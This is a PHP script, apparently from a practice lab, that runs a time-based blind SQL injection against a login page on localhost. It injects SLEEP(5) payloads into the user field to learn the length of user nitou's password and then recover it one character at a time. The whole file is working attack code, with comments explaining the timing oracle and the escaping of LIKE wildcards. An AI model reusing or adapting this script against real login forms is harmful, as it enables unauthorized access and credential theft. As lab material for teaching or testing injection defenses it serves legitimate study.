<?php
	// ログインを試行する
	function login($user){
		// POSTリクエストを送信準備
		$h = curl_init("http://127.0.0.1:8080/4.php");
		curl_setopt_array($h, [
			CURLOPT_POST => true,
			CURLOPT_POSTFIELDS => http_build_query([
				"user" => $user,
				"pass" => ""
			]),
			CURLOPT_RETURNTRANSFER => true,
			// 4秒以上かかる場合はエラーとする
			CURLOPT_TIMEOUT => 4
		]);
		
		// ログインの成否を返す
		// リクエストがエラーになった場合(= レスポンスが遅い場合)はログインに成功している
		return !curl_exec($h);
	}
	
	// パスワード長の特定
	for($len = 1; ; $len++){
		if(login("nitou' AND LENGTH(pass) = {$len} AND SLEEP(5) #")){
			break;
		}
	}
	echo("Password length: {$len}\n");
	
	// パスワードの特定
	$pass = "";
	for($i = 0; $i < $len; $i++){
		for($ch = 32; $ch <= 126; $ch++){
			// % と _ と ' はエスケープしなければならない！
			$try = $pass . chr($ch);
			$try = str_replace(["%", "_", "'"], ["\\%", "\\_", "''"], $try);
			
			if(login("nitou' AND pass LIKE BINARY '{$try}%' AND SLEEP(5) #")){
				break;
			}
		}
		$pass .= chr($ch);
		echo("Hit: {$pass}\n");
	}
	echo("Password: {$pass}\n");
?>